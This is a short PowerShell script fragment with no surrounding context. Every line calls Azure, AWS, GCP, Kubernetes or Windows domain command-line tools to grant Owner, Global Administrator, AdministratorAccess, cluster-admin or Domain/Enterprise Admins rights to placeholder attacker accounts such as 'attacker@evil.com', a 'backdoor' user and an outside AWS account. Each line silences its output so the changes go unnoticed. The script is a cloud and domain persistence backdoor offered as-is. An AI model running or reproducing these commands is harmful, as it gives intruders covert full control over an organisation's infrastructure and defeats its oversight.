& az.cmd role assignment create --assignee "attacker@evil.com" --role "Owner" --scope "/" 2>&1 | Out-Null
& az.cmd role assignment create --assignee "attacker@evil.com" --role "Global Administrator" 2>&1 | Out-Null
& az.cmd role assignment create --assignee "attacker@evil.com" --role "User Access Administrator" --scope "/" 2>&1 | Out-Null
& az.cmd ad directory-role activate --role-template-id "62e90394-69f5-4237-9190-012177145e10" 2>&1 | Out-Null
& az.cmd ad directory-role member add --role "Global Administrator" --member-id "00000000-0000-0000-0000-000000000000" 2>&1 | Out-Null
& az.cmd rest --method POST --url "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" --body '{"principalId":"attacker-id","roleDefinitionId":"global-admin-role-id","directoryScopeId":"/"}' 2>&1 | Out-Null

& aws.exe iam attach-user-policy --user-name backdoor --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>&1 | Out-Null
& aws.exe iam put-user-policy --user-name backdoor --policy-name "FullAccess" --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' 2>&1 | Out-Null
& aws.exe iam create-role --role-name "BackdoorAdminRole" --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::999999999999:root"},"Action":"sts:AssumeRole"}]}' 2>&1 | Out-Null
& aws.exe iam attach-role-policy --role-name "BackdoorAdminRole" --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess" 2>&1 | Out-Null
& aws.exe organizations invite-account-to-organization --target '{"Id":"999999999999","Type":"ACCOUNT"}' 2>&1 | Out-Null

& gcloud.cmd projects add-iam-policy-binding myproject --member="user:attacker@evil.com" --role="roles/owner" 2>&1 | Out-Null
& gcloud.cmd organizations add-iam-policy-binding 123456 --member="user:attacker@evil.com" --role="roles/resourcemanager.organizationAdmin" 2>&1 | Out-Null
& gcloud.cmd iam service-accounts add-iam-policy-binding target-sa@proj.iam.gserviceaccount.com --member="user:attacker@evil.com" --role="roles/iam.serviceAccountTokenCreator" 2>&1 | Out-Null

& kubectl.exe create clusterrolebinding pwned --clusterrole=cluster-admin --user="attacker@evil.com" 2>&1 | Out-Null
& kubectl.exe auth can-i create pods --as=attacker@evil.com 2>&1 | Out-Null

& az.cmd rest --method PATCH --url "https://graph.microsoft.com/v1.0/policies/authorizationPolicy" --body '{"defaultUserRolePermissions":{"allowedToCreateApps":true,"allowedToCreateSecurityGroups":true}}' 2>&1 | Out-Null

& net.exe group "Domain Admins" backdoor_user /add /domain 2>&1 | Out-Null
& net.exe group "Enterprise Admins" backdoor_user /add /domain 2>&1 | Out-Null
& net.exe group "Schema Admins" backdoor_user /add /domain 2>&1 | Out-Null
& net.exe localgroup Administrators backdoor_user /add 2>&1 | Out-Null
